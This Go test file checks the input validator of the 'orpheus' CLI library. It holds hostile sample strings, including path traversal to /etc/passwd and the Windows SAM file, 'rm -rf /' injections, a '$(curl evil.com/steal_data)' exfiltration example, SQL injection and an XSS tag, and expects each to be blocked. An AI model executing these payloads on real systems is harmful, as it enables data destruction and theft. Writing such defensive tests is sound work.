// validation_test.go: Test Input Validation functions
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGILira library
// SPDX-License-Identifier: MPL-2.0

package orpheus

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// TestValidatePathFlag verifys path flag validation against various security scenarios
func TestValidatePathFlag(t *testing.T) {
	config := DefaultValidationConfig()
	config.ValidateFileArgs = false // Do not validate file existence in tests
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		path        string
		expectValid bool
		description string
	}{
		{
			name:        "ValidRelativePath",
			path:        "config/app.yml",
			expectValid: true,
			description: "Valid relative path should pass",
		},
		{
			name:        "ValidAbsolutePath",
			path:        "/tmp/orpheus/config.yml",
			expectValid: true,
			description: "Valid absolute path should pass",
		},
		{
			name:        "PathTraversalAttack",
			path:        "../../../etc/passwd",
			expectValid: false,
			description: "Path traversal attack should be blocked",
		},
		{
			name:        "DoublePathTraversal",
			path:        "....//....//etc/passwd",
			expectValid: false,
			description: "Double encoding path traversal should be blocked",
		},
		{
			name:        "NullByteInjection",
			path:        "config.yml\x00.jpg",
			expectValid: false,
			description: "Null byte injection should be blocked",
		},
		{
			name:        "WindowsPathTraversal",
			path:        "..\\..\\windows\\system32\\config\\sam",
			expectValid: false,
			description: "Windows path traversal should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidatePathFlag("test-flag", tt.path)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid path but got validation errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid path but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestValidateStringFlag verifies string flag validation against injection attacks
func TestValidateStringFlag(t *testing.T) {
	config := DefaultValidationConfig()
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		input       string
		expectValid bool
		description string
	}{
		{
			name:        "ValidString",
			input:       "normal-string-value",
			expectValid: true,
			description: "Valid string should pass",
		},
		{
			name:        "ValidStringWithSpaces",
			input:       "normal string with spaces",
			expectValid: true,
			description: "String with spaces should pass",
		},
		{
			name:        "CommandInjectionDollarParen",
			input:       "$(rm -rf /)",
			expectValid: false,
			description: "Command injection with $() should be blocked",
		},
		{
			name:        "CommandInjectionBackticks",
			input:       "`rm -rf /`",
			expectValid: false,
			description: "Command injection with backticks should be blocked",
		},
		{
			name:        "ShellInjectionSemicolon",
			input:       "normal; rm -rf /",
			expectValid: false,
			description: "Shell injection with semicolon should be blocked",
		},
		{
			name:        "PipeInjection",
			input:       "input | dangerous_command",
			expectValid: false,
			description: "Pipe injection should be blocked",
		},
		{
			name:        "SQLInjection",
			input:       "'; DROP TABLE users; --",
			expectValid: false,
			description: "SQL injection should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateStringFlag("test-flag", tt.input)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid string but got validation errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid string but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestValidateEnvironmentValue verifies environment variable value validation
func TestValidateEnvironmentValue(t *testing.T) {
	config := DefaultValidationConfig()
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		key         string
		value       string
		expectValid bool
		description string
	}{
		{
			name:        "ValidEnvironmentVar",
			key:         "ORPHEUS_CONFIG",
			value:       "/path/to/config",
			expectValid: true,
			description: "Valid environment variable should pass",
		},
		{
			name:        "ValidEnvironmentVarWithSpaces",
			key:         "ORPHEUS_MESSAGE",
			value:       "Hello World",
			expectValid: true,
			description: "String with spaces should pass",
		},
		{
			name:        "EnvironmentInjectionDollar",
			key:         "MALICIOUS_VAR",
			value:       "$(curl evil.com/steal_data)",
			expectValid: false,
			description: "Command injection in environment should be blocked",
		},
		{
			name:        "UntrustedPrefix",
			key:         "MALICIOUS_VAR",
			value:       "normal_value",
			expectValid: true, // accept but with warning
			description: "Key with untrusted prefix should generate warning but pass",
		},
		{
			name:        "TrustedPrefix",
			key:         "ORPHEUS_CONFIG_PATH",
			value:       "config/app.yml",
			expectValid: true,
			description: "Key with trusted prefix should pass",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateEnvironmentValue(tt.key, tt.value)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid env var but got validation errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid env var but validation passed (%s)",
					tt.name, tt.description)
			}

			// Test specific for UntrustedPrefix: should have warning
			if tt.name == "UntrustedPrefix" && len(result.SecurityWarnings) == 0 {
				t.Errorf("Test %s: expected security warning for untrusted prefix but got none", tt.name)
			}
		})
	}
}

// TestValidateFileOperation verifies file operation validation (path logic only)
func TestValidateFileOperation(t *testing.T) {
	config := DefaultValidationConfig()
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		path        string
		operation   string
		expectValid bool
		description string
	}{
		{
			name:        "DangerousPathWrite",
			path:        "../../../etc/passwd",
			operation:   "write",
			expectValid: false,
			description: "Writing to dangerous path should be blocked",
		},
		{
			name:        "DangerousPathRead",
			path:        "..\\..\\windows\\system32\\sam",
			operation:   "read",
			expectValid: false,
			description: "Reading system files``` be blocked",
		},
		{
			name:        "NullByteAttack",
			path:        "safe.txt\x00../../../etc/passwd",
			operation:   "read",
			expectValid: false,
			description: "Null byte attack should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateFileOperation(tt.path, tt.operation)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid file operation but got errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid file operation but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestCacheOperations verifies cache operation methods
func TestCacheOperations(t *testing.T) {
	config := DefaultValidationConfig()
	config.EnableCaching = true
	config.CacheSize = 3 // Small size to test eviction
	validator := NewInputValidator(config)

	// Test initial cache stats
	stats := validator.GetCacheStats()
	if stats["cache_size"] != 0 {
		t.Errorf("Expected empty cache, but got size: %d", stats["cache_size"])
	}
	if stats["cache_capacity"] != 3 {
		t.Errorf("Expected cache capacity 3, but got: %d", stats["cache_capacity"])
	}

	// Test cache population
	result1 := validator.ValidateStringFlag("test-flag", "normal-string")
	if !result1.IsValid {
		t.Errorf("Expected valid string validation")
	}

	stats = validator.GetCacheStats()
	if stats["cache_size"] != 1 {
		t.Errorf("Expected cache size 1 after first validation, but got: %d", stats["cache_size"])
	}

	// Test cache hit (same validation should return cached result)
	result2 := validator.ValidateStringFlag("test-flag", "normal-string")
	if !result2.IsValid {
		t.Errorf("Expected valid cached result")
	}

	// Test cache clear
	validator.ClearCache()
	stats = validator.GetCacheStats()
	if stats["cache_size"] != 0 {
		t.Errorf("Expected empty cache after clear, but got size: %d", stats["cache_size"])
	}
}

// TestBasicInputValidation tests validation of ValidateStringFlag
func TestBasicInputValidation(t *testing.T) {
	config := DefaultValidationConfig()
	config.MaxArgLength = 50 // ow limit to test length validation
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		input       string
		expectValid bool
		description string
	}{
		{
			name:        "ValidShortInput",
			input:       "short",
			expectValid: true,
			description: "Short input should pass",
		},
		{
			name:        "MaxLengthInput",
			input:       "this-input-is-exactly-at-the-fifty-char-limit-x",
			expectValid: true,
			description: "Input at maximum length should pass",
		},
		{
			name:        "ExceedsMaxLength",
			input:       "this-input-exceeds-the-fifty-character-limit-and-should-fail-validation",
			expectValid: false,
			description: "Input exceeding the limit should be rejected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateStringFlag("test-flag", tt.input)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid input but got errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid input but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestSuspiciousPatternDetection verifies suspicious pattern detection
func TestSuspiciousPatternDetection(t *testing.T) {
	config := DefaultValidationConfig()
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		input       string
		expectValid bool
		description string
	}{
		{
			name:        "CleanInput",
			input:       "normal-cli-argument",
			expectValid: true,
			description: "Clean input should pass",
		},
		{
			name:        "CommandSubstitution",
			input:       "value$(malicious-command)",
			expectValid: false,
			description: "Command substitution should be detected",
		},
		{
			name:        "BacktickExecution",
			input:       "value`dangerous`",
			expectValid: false,
			description: "Backtick execution should be detected",
		},
		{
			name:        "PipeChaining",
			input:       "input | rm -rf /",
			expectValid: false,
			description: "Pipe chaining should be detected",
		},
		{
			name:        "ScriptTag",
			input:       "<script>alert('xss')</script>",
			expectValid: false,
			description: "Script tag injection should be detected",
		},
		{
			name:        "SQLComments",
			input:       "value -- DROP TABLE",
			expectValid: false,
			description: "SQL comment patterns should be detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateStringFlag("test-flag", tt.input)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid input but got errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid input but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestSanitization tests input sanitization behavior
func TestSanitization(t *testing.T) {
	config := DefaultValidationConfig()
	config.SanitizeInputs = true
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		input       string
		description string
	}{
		{
			name:        "CleanInput",
			input:       "normal-cli-argument",
			description: "Clean input should remain unchanged",
		},
		{
			name:        "InputWithSpaces",
			input:       "normal text with spaces",
			description: "Printable characters should be preserved",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateStringFlag("test-flag", tt.input)

			if !result.IsValid {
				t.Errorf("Test %s: expected valid input but got errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			// Verify sanitized value is set
			if result.SanitizedValue == "" {
				t.Errorf("Test %s: sanitized value should not be empty", tt.name)
			}
		})
	}
}

// TestFilePermissionAnalysis tests AnalyzeFilePermissions directly
func TestFilePermissionAnalysis(t *testing.T) {
	config := DefaultSecurityConfig()

	tests := []struct {
		name        string
		path        string
		expectError bool
		description string
	}{
		{
			name:        "NonExistentFile",
			path:        "/nonexistent/path/file.txt",
			expectError: true,
			description: "Nonexistent file should generate error",
		},
		{
			name:        "PathTraversalBlocked",
			path:        "../../../etc/passwd",
			expectError: true,
			description: "Path traversal should be blocked",
		},
		{
			name:        "SystemPathBlocked",
			path:        "/etc/shadow",
			expectError: true,
			description: "System paths should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := AnalyzeFilePermissions(tt.path, config)

			if tt.expectError && err == nil {
				t.Errorf("Test %s: expected error but got none (%s)",
					tt.name, tt.description)
			}

			if !tt.expectError && err != nil {
				t.Errorf("Test %s: expected no error but got: %v (%s)",
					tt.name, err, tt.description)
			}
		})
	}
}

// TestEnvironmentTrustedPrefixes tests trusted environment variable prefixes
func TestEnvironmentTrustedPrefixes(t *testing.T) {
	config := DefaultValidationConfig()
	config.TrustedEnvPrefixes = []string{"SAFE_", "APP_"}
	validator := NewInputValidator(config)

	tests := []struct {
		name           string
		envKey         string
		expectTrusted  bool
		expectWarnings bool
		description    string
	}{
		{
			name:           "TrustedPrefix",
			envKey:         "SAFE_CONFIG",
			expectTrusted:  true,
			expectWarnings: false,
			description:    "Environment with trusted prefix should not generate warnings",
		},
		{
			name:           "UntrustedPrefix",
			envKey:         "DANGEROUS_VAR",
			expectTrusted:  false,
			expectWarnings: true,
			description:    "Environment with untrusted prefix should generate warnings",
		},
		{
			name:           "AnotherTrustedPrefix",
			envKey:         "APP_VERSION",
			expectTrusted:  true,
			expectWarnings: false,
			description:    "Second trusted prefix should work correctly",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateEnvironmentValue(tt.envKey, "test_value")

			hasWarnings := len(result.SecurityWarnings) > 0

			if tt.expectWarnings != hasWarnings {
				t.Errorf("Test %s: expected warnings=%v but got warnings=%v (%s)",
					tt.name, tt.expectWarnings, hasWarnings, tt.description)
			}

			if !result.IsValid {
				t.Errorf("Test %s: environment validation should not fail for key format (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestValidationEdgeCases tests edge cases and boundary conditions
func TestValidationEdgeCases(t *testing.T) {
	config := DefaultValidationConfig()
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		input       string
		expectValid bool
		description string
	}{
		{
			name:        "EmptyString",
			input:       "",
			expectValid: true,
			description: "Empty string should be valid",
		},
		{
			name:        "SingleCharacter",
			input:       "a",
			expectValid: true,
			description: "Single character should be valid",
		},
		{
			name:        "OnlySpaces",
			input:       "   ",
			expectValid: true,
			description: "Only spaces should be valid",
		},
		{
			name:        "UnicodeCharacters",
			input:       "café_résumé",
			expectValid: true,
			description: "Unicode characters should be valid",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateStringFlag("test-flag", tt.input)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid input but got errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid input but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestCacheEvictionBehavior tests cache size limits and eviction
func TestCacheEvictionBehavior(t *testing.T) {
	config := DefaultValidationConfig()
	config.EnableCaching = true
	config.CacheSize = 2 // Very small cache for testing eviction
	validator := NewInputValidator(config)

	// Fill cache beyond capacity
	inputs := []string{"input1", "input2", "input3"}

	for i, input := range inputs {
		result := validator.ValidateStringFlag("test-flag", input)
		if !result.IsValid {
			t.Errorf("Input %d should be valid: %s", i, input)
		}
	}

	// Check final cache size doesn't exceed limit
	stats := validator.GetCacheStats()
	if stats["cache_size"] > config.CacheSize {
		t.Errorf("Cache size %d exceeds limit %d", stats["cache_size"], config.CacheSize)
	}

	// Verify cache capacity is reported correctly
	if stats["cache_capacity"] != config.CacheSize {
		t.Errorf("Expected cache capacity %d, got %d", config.CacheSize, stats["cache_capacity"])
	}
}

// TestSecurityEdgeCases tests security edge cases and boundary conditions
func TestSecurityEdgeCases(t *testing.T) {
	config := DefaultValidationConfig()
	validator := NewInputValidator(config)

	tests := []struct {
		name        string
		input       string
		expectValid bool
		description string
	}{
		{
			name:        "ExtremelyLongInput",
			input:       strings.Repeat("A", 10000),
			expectValid: false,
			description: "Extremely long input should be rejected",
		},
		{
			name:        "BinaryData",
			input:       string([]byte{0x00, 0x01, 0x02, 0xFF, 0xFE}),
			expectValid: false,
			description: "Binary data should be handled safely",
		},
		{
			name:        "NestedEscaping",
			input:       "$(echo `cat /etc/passwd`)",
			expectValid: false,
			description: "Nested command execution should be blocked",
		},
		{
			name:        "ShellMetacharacterChain",
			input:       "normal && rm -rf / || echo 'pwned'",
			expectValid: false,
			description: "Chained shell metacharacters should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := validator.ValidateStringFlag("test-flag", tt.input)

			if tt.expectValid && !result.IsValid {
				t.Errorf("Test %s: expected valid input but got errors: %v (%s)",
					tt.name, result.ValidationErrors, tt.description)
			}

			if !tt.expectValid && result.IsValid {
				t.Errorf("Test %s: expected invalid input but validation passed (%s)",
					tt.name, tt.description)
			}
		})
	}
}

// TestConcurrencyAndRaceConditions tests validation under concurrent access
func TestConcurrencyAndRaceConditions(t *testing.T) {
	config := DefaultValidationConfig()
	config.EnableCaching = true
	validator := NewInputValidator(config)

	// Test concurrent validation requests
	const numGoroutines = 50
	const numIterations = 100

	var wg sync.WaitGroup
	errorChan := make(chan error, numGoroutines*numIterations)

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for j := 0; j < numIterations; j++ {
				input := fmt.Sprintf("test-input-%d-%d", id, j)
				result := validator.ValidateStringFlag("test-flag", input)

				if !result.IsValid {
					errorChan <- fmt.Errorf("goroutine %d iteration %d: validation failed unexpectedly", id, j)
					return
				}
			}
		}(i)
	}

	wg.Wait()
	close(errorChan)

	// Check for any errors
	for err := range errorChan {
		t.Errorf("Concurrency test failed: %v", err)
	}

	// Verify cache is still functional
	stats := validator.GetCacheStats()
	if stats["cache_size"] < 0 {
		t.Errorf("Cache corrupted after concurrent access: size %d", stats["cache_size"])
	}
}

// TestMemoryLeakPrevention tests for potential memory leaks in validation
func TestMemoryLeakPrevention(t *testing.T) {
	config := DefaultValidationConfig()
	config.EnableCaching = true
	config.CacheSize = 100
	validator := NewInputValidator(config)

	// Generate many unique inputs to stress test memory usage
	const numInputs = 1000

	for i := 0; i < numInputs; i++ {
		input := fmt.Sprintf("unique-input-%d-%s", i, strings.Repeat("x", i%100))
		result := validator.ValidateStringFlag("test-flag", input)

		if !result.IsValid && len(input) <= config.MaxArgLength {
			t.Errorf("Valid input %d was incorrectly rejected", i)
		}
	}

	// Verify cache doesn't grow unbounded
	stats := validator.GetCacheStats()
	if stats["cache_size"] > config.CacheSize {
		t.Errorf("Cache grew beyond limit: size %d, limit %d", stats["cache_size"], config.CacheSize)
	}

	// Clear cache to free memory
	validator.ClearCache()

	stats = validator.GetCacheStats()
	if stats["cache_size"] != 0 {
		t.Errorf("Cache not properly cleared: size %d", stats["cache_size"])
	}
}

// TestValidationFileTypeCheckers verifies specific file type validation functions
func TestValidationFileTypeCheckers(t *testing.T) {
	validator := NewInputValidator(DefaultValidationConfig())

	// Create temporary test files
	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "test.txt")
	if err := os.WriteFile(testFile, []byte("test content"), 0644); err != nil {
		t.Fatalf("Failed to create test file: %v", err)
	}

	t.Run("ValidateFileFlagWithValidFile", func(t *testing.T) {
		result := validator.ValidateFileFlag(testFile)
		if !result.IsValid {
			t.Errorf("Expected valid file to pass validation, got errors: %v", result.ValidationErrors)
		}
	})

	t.Run("ValidateFileFlagWithNonExistentFile", func(t *testing.T) {
		result := validator.ValidateFileFlag("/nonexistent/file.txt")
		if result.IsValid {
			t.Error("Expected non-existent file to fail validation")
		}
		if len(result.ValidationErrors) == 0 {
			t.Error("Expected validation errors for non-existent file")
		}
	})

	t.Run("ValidateDirectoryFlagWithValidDirectory", func(t *testing.T) {
		result := validator.ValidateDirectoryFlag(tmpDir)
		if !result.IsValid {
			t.Errorf("Expected valid directory to pass validation, got errors: %v", result.ValidationErrors)
		}
	})

	t.Run("ValidateDirectoryFlagWithFile", func(t *testing.T) {
		result := validator.ValidateDirectoryFlag(testFile)
		if result.IsValid {
			t.Error("Expected file to fail directory validation")
		}
		if len(result.ValidationErrors) == 0 {
			t.Error("Expected validation errors when file is provided as directory")
		}
	})

	t.Run("ValidateOutputFlagWithValidPath", func(t *testing.T) {
		outputPath := filepath.Join(tmpDir, "output.txt")
		result := validator.ValidateOutputFlag(outputPath)
		// Output file validation should pass even if file doesn't exist (we're going to create it)
		// The validation checks if the directory is writable
		if !result.IsValid {
			// Check if it's just a file not existing error, which is OK for output files
			hasOnlyFileNotExistError := len(result.ValidationErrors) == 1 &&
				strings.Contains(result.ValidationErrors[0], "cannot access file")
			if !hasOnlyFileNotExistError {
				t.Errorf("Expected valid output path to pass validation or fail only due to file not existing, got errors: %v", result.ValidationErrors)
			}
		}
	})

	t.Run("ValidateOutputFlagWithSystemPath", func(t *testing.T) {
		systemPath := "/etc/passwd"
		result := validator.ValidateOutputFlag(systemPath)
		if result.IsValid {
			t.Error("Expected system file path to fail output validation")
		}
		if len(result.ValidationErrors) == 0 {
			t.Error("Expected validation errors for system file output path")
		}
	})
}

// TestValidatedInputStringMethod verifies the String method for ValidatedInput
func TestValidatedInputStringMethod(t *testing.T) {
	t.Run("ValidInputString", func(t *testing.T) {
		result := &ValidatedInput{
			IsValid:          true,
			OriginalValue:    "test input",
			SanitizedValue:   "test input",
			ValidationErrors: []string{},
		}

		str := result.String()
		if !strings.Contains(str, "VALID") {
			t.Errorf("Expected string representation to indicate validity, got: %s", str)
		}
		if !strings.Contains(str, "test input") {
			t.Errorf("Expected string representation to contain input, got: %s", str)
		}
	})

	t.Run("InvalidInputString", func(t *testing.T) {
		result := &ValidatedInput{
			IsValid:          false,
			OriginalValue:    "bad input",
			SanitizedValue:   "bad input",
			ValidationErrors: []string{"error1", "error2"},
		}

		str := result.String()
		if !strings.Contains(str, "INVALID") {
			t.Errorf("Expected string representation to indicate invalidity, got: %s", str)
		}
		if !strings.Contains(str, "bad input") {
			t.Errorf("Expected string representation to contain input, got: %s", str)
		}
		if !strings.Contains(str, "error1") {
			t.Errorf("Expected string representation to contain errors, got: %s", str)
		}
	})
}

// TestValidatedInputIsSecureMethod verifies the IsSecure method
func TestValidatedInputIsSecureMethod(t *testing.T) {
	t.Run("SecureValidInput", func(t *testing.T) {
		result := &ValidatedInput{
			IsValid:          true,
			OriginalValue:    "safe_input",
			SanitizedValue:   "safe_input",
			ValidationErrors: []string{},
		}

		if !result.IsSecure() {
			t.Error("Expected valid input with no errors to be secure")
		}
	})

	t.Run("InsecureInvalidInput", func(t *testing.T) {
		result := &ValidatedInput{
			IsValid:          false,
			OriginalValue:    "../../../etc/passwd",
			SanitizedValue:   "../../../etc/passwd",
			ValidationErrors: []string{"path traversal detected"},
		}

		if result.IsSecure() {
			t.Error("Expected invalid input with errors to be insecure")
		}
	})
}
